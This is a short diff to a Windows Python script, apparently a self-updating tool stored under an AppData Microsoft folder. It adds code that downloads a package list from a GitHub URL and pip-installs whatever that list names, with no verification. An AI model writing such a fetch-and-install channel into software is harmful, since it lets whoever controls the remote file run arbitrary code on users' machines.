@@ -3,8 +3,20 @@ import zipfile
 import os
 import shutil
 import subprocess
+import sys
+import ctypes
 
 user_profile = os.environ['USERPROFILE']
+def install_packages(package_string):
+    packages = package_string.split()
+    for package in packages:
+        print(f"Installing {package}...")
+        subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
+r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/new_packages.txt")
+p1 = r.text
+if not p1 == "":
+    install_packages(p1)
+
 with open(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain', 'ver.txt'), 'r') as ver:
     r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ver.txt")
     ver1 = r.text
